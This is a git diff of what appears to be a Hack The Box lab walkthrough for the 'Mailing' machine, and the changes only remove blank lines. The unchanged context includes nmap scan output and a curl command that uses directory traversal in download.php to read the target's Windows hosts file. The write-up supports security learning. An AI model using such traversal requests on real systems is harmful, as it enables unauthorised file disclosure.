@@ -32,7 +32,6 @@ Mailing is an easy Windows machine that runs `hMailServer` and hosts a website v
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Sun May  5 05:39:39 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,57348, Mailing
 Nmap scan report for Mailing (10.129.56.233)
 Host is up, received user-set (0.21s latency).
@@ -193,7 +192,6 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sun May  5 05:49:38 2024 -- 1 IP address (1 host up) scanned in 598.78 seconds
 ```
 
@@ -328,46 +326,26 @@ http://mailing.htb:80/download.php?file=instructions.pdf
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Mailing]
 └─$ curl 'http://mailing/download.php?file=../../../../../../../../../../../../WINDOWS/System32/drivers/etc/hosts'
-
 # Copyright (c) 1993-2009 Microsoft Corp.
-
 #
-
 # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
-
 #
-
 # This file contains the mappings of IP addresses to host names. Each
-
 # entry should be kept on an individual line. The IP address should
-
 # be placed in the first column followed by the corresponding host name.
-
 # The IP address and the host name should be separated by at least one
-
 # space.
-
 #
-
 # Additionally, comments (such as these) may be inserted on individual
-
 # lines or following the machine name denoted by a '#' symbol.
-
 #
-
 # For example:
-
 #
-
 #      102.54.94.97     rhino.acme.com          # source server
-
 #       38.25.63.10     x.acme.com              # x client host
 
-
 # localhost name resolution is handled within DNS itself.
-
 #       127.0.0.1       localhost
-
 #       ::1             localhost
 
 127.0.0.1       mailing.htb
@@ -390,10 +368,8 @@ fieldset{padding:0 15px 10px 15px;}
 h1{font-size:2.4em;margin:0;color:#FFF;}
 h2{font-size:1.7em;margin:0;color:#CC0000;}
 h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}
-
 #header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
 background-color:#555555;}
-
 #content{margin:0 0 0 2%;position:relative;}
 .content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
 -->
